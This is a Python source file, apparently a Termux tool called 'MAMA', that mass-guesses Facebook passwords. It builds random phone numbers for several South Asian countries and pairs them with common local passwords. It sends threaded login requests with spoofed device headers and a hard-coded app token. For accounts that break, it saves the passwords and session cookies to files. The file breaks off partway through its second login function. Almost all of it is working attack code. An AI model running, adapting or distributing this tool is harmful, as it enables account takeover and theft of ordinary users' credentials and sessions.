#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
def clear():
        os.system('clear')
print(f'\x1b[38;5;8m❲\x1b[1;97m=\x1b[38;5;8m❳\x1b[38;5;46m INSTALLED SYSTEM ')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python MAMA.py')
except:pass
#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| UA |__________________#
def saad_vai():
        END = "[FBAN/Orca-Android;FBAV/248.0.0.7.127;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/194293860;FBCR/PLAY;FBMF/LGE;FBBD/lge;FBDV/LG-M250;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1193};FB_FW/1;] FBBK/1 "
        ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) "
#__________________| LOGO |__________________#
logo=(f"""
{G1}███    ███  █████  ███    ███  █████  
{G2}████  ████ ██   ██ ████  ████ ██   ██ 
{G3}██ ████ ██ ███████ ██ ████ ██ ███████ 
{G4}██  ██  ██ ██   ██ ██  ██  ██ ██   ██ 
{G5}██      ██ ██   ██ ██      ██ ██   ██                                                                             
\x1b[38;5;46m\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mDEVELOPER \x1b[38;5;254m● \x1b[38;5;46mFAHAD AHMED SAAD 
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mFACEBOOK  \x1b[38;5;254m● \x1b[38;5;46mMAMA-148  TERMUX COMMUNITY
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mTOOLTYPE \x1b[38;5;254m ● {G1}RANDOM {A}&{G1} FILE CRACK
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mVERSION \x1b[38;5;254m  ● {G1}[0.0.2] 
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mBROTHERS \x1b[38;5;254m ● {G1}ALFE SANI 
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mGITHUB \x1b[38;5;254m   ● \x1b[38;5;46mMAMA-148
\x1b[38;5;50m\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m""")
#__________________| MAIN |__________________#
def menu():
        try:
                        clear()
                        print(f'{B}❲{A}1{B}❳{G} FILE CLONING \n{B}❲{A}2{B}❳{G} RANDOM CLONING\n{B}❲{A}3{B}❳{G} CONTACT TOOL OWNER\n{B}❲{A}0{B}❳{G} EXIT TOOL')
                        linex()
                        xd=input(f'{B}❲{A}?{B}❳{G} CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : /sdcard/mama.txt ');linex()
                                file = input(f'{B}❲{A}?{B}❳{G} FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{B}❲{A}={B}❳{G} FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{B}❲{A}1{B}❳{G} METHOD {B}❲{A}M1{B}❳');linex()
                                mthd=input(f'{B}❲{A}?{B}❳{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'                  PASSWORD SYSTEM');linex();print(f'{B}❲{A}1{B}❳{G} AUTO PASSWORD CLONE\n{B}❲{A}2{B}❳{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{B}❲{A}?{B}❳{G} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('57575751')
                                        plist.append('57273200')
                                        plist.append('singam')
                                        plist.append('59039200')
                                        plist.append('firstlast')
                                        plist.append('@@first@@')
                                        plist.append('firstlast')
                                        plist.append('last@@@')
                                        plist.append('last@@')
                                        plist.append('last1234')
                                        plist.append('last@1234')
                                        plist.append('last@123')
                                        plist.append('firstlast1234')
                                        plist.append('firstlast123')
                                        plist.append('firstlast786')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'{B}❲{A}={B}❳{G} PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'{B}❲{A}={B}❳{G} EXAMPLE : firstlast{B}/{G}first@@{B}/{G}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'{B}❲{A}={B}❳{G} PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'{B}❲{A}={B}❳{G} CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{B}❲{A}?{B}❳{G} CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'{B}❲{A}={B}❳{G} TOTAL ACCOUNT :{A} '+total_ids+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
                                        print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
                                print(f'{B}❲{A}={B}❳{G} TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                randm()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/saad8824');menu()
                        elif xd in ['0','05']:
                                exit(f'{B}❲{A}={B}❳{G} EXIT DONE ')
                        else:
                                exit(f'{B}❲{A}={B}❳{G} OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'{B}❲{A}={B}❳{G} NO INTERNET CONNECTION...')
                exit()
#__________________| RANDOM |__________________#
def randm():
    clear()
    print(f'{B}❲{A}1{B}❳{G} BANGLADESH CLONING ')
    print(f'{B}❲{A}2{B}❳{G} INDIA CLONING ')
    print(f'{B}❲{A}0{B}❳{G} BACK TO MENU ');linex()
    option=input(f'{B}❲{A}?{B}❳{G} CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
    elif option in ['3','C']:
    	nepal()
    elif option in ['4','D']:
    	pakistan()
    elif option in ['5','E']:
    	afghanistan()
    elif option in ['6','00']:
    	gmail()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'{B}❲{A}={B}❳{G} BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G} EXAMPLE : 017 | 019 | 018 | 016 ');linex()
		code = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G} METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G} METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G} METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as saad_vau:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire','jannat']
				if mthd in ['1','01']:
					saad_vau.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					saad_vau.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					saad_vau.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()
#__________________| INDIA |__________________#
def india():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G} EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
		code = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G} METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G} METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G} METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as saad_vau:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid[:8],'57273200','59039200','57575751']
				if mthd in ['1','01']:
					saad_vau.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					saad_vau.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					saad_vau.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()
#__________________| NEPAL |__________________#
def nepal():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G} EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
		code = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G} METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G} METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G} METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=30) as saad_vau:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
				if mthd in ['1','01']:
					saad_vau.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					saad_vau.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					saad_vau.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()
#__________________| PAKISTAN |__________________#
def pakistan():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G} EXAMPLE : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G} METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G} METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G} METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as saad_vau:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if mthd in ['1','01']:
					saad_vau.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					saad_vau.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					saad_vau.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()
#__________________| AFGHANISTAN |__________________#
def afghanistan():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{G} EXAMPLE : +9340 | +9360 | +9330 | +9350');linex()
		code = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{G} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{G} METHOD {B}❲{A}M1{B}❳{G} \n{B}❲{A}2{B}❳{G} METHOD {B}❲{A}M2{B}❳{G}\n{B}❲{A}3{B}❳{G} METHOD {B}❲{A}M3{B}❳{G} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as saad_vau:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{G} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
				if mthd in ['1','01']:
					saad_vau.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					saad_vau.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					saad_vau.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{G} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{G} PRESS ENTER TO BACK ')
		menu()		
#__________________| FILE METHOD M1 |__________________#
def api1(ids,names,passlist):
        try:
                global oks,loop,sim_id,device
                sys.stdout.write(f'\r\r{B}❲{G}MAMA-M1{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        saad_vau = 'Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/null;FBMF/sumsung;FBBD/sumsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;] Mozilla/5.0 (Linux; Android 9.0; SM-W2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Mobile Safari/537.36 Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                "sim_country": "id",
                                'try_num':'1',
                                'family_device_id':family,
                                'sim_serials':sim_serials,
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'logged_out_id': str(uuid.uuid4()),
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'tier': 'regular',
                                'reg_instance': str(uuid.uuid4()),
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'locale':fblc,
                                'client_country_code':'',
                                'fb_api_req_friendly_name':'authenticate',
                                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                                'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1',
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}MAMA-OK{B}❳{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/MAMA-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}MAMA-CP{B}❳{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MAMA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| FILE METHOD M2 |__________________#
def api2(ids,names,passlist):
        try:
                global oks,loop,sim_id
                sys.stdout.write(f'\r\r{B}❲{G}MAMA-M2{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua ='Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "sim_country": "id",
                                "network_country": "id",
                                "enroll_misauth": "false",
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                "cpl": "true",
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
